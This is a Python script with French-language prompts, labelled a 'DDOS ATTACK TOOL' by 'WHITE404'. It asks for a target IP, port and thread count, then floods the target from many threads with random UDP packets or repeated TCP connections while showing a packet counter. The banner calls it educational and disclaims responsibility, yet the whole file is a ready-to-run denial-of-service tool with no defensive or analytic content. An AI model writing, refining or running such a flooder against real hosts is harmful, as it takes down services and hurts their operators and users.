import socket
import threading
import random
import argparse
import sys
import time
import itertools

# Affichage stylé
HEADER = """
\033[1;36m
█████████████████████████████████████████████████████████████████████
        🛡️ DDOS ATTACK TOOL - By \033[1;33 WHITE404 \033[1;36m 🛡️
█████████████████████████████████████████████████████████████████████

\033[1;32m[Machine Attaquante] ---> 🌐💥 ---> [Machine Cible]\033[0m

             ______________               ______________
            |              |             |              |
            |   SERVER     |             |   TARGET     |
            |______________|             |______________|

\033[1;31m[!] ATTENTION : Ce script est éducatif. L'auteur ne sera pas responsable des abus. Utilisez à vos risques et périls.\033[0m
"""

packet_count = 0
lock = threading.Lock()

def attack(target_ip, target_port, mode):
    global packet_count
    while True:
        try:
            if mode == "udp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_data = random._urandom(1024)
                sock.sendto(bytes_data, (target_ip, target_port))
            elif mode == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.send(random._urandom(1024))
                sock.close()
            with lock:
                packet_count += 1
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            break

def animate_packets():
    for c in itertools.cycle(['🌐➡️', '🌐➔', '🌐➤', '🌐➠']):
        sys.stdout.write(f'\r\033[92m[+] Packets sent: {packet_count} {c}\033[0m')
        sys.stdout.flush()
        time.sleep(0.2)

def main():
    print(HEADER)

    # Demande interactive
    target_ip = input("\033[96m[?] Entrez l'IP cible: \033[0m").strip()
    target_port = int(input("\033[96m[?] Entrez le port cible: \033[0m").strip())
    threads = int(input("\033[96m[?] Nombre de threads (par défaut 100): \033[0m") or 100)
    mode = input("\033[96m[?] Mode (tcp/udp, par défaut udp): \033[0m").strip().lower() or "udp"

    print(f"\033[94m[+] Lancement de l'attaque sur {target_ip}:{target_port} en mode {mode.upper()} avec {threads} threads\033[0m")

    anim_thread = threading.Thread(target=animate_packets)
    anim_thread.daemon = True
    anim_thread.start()

    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, mode))
        thread.daemon = True
        thread.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Arrêt de l'attaque...\033[0m")
        sys.exit()
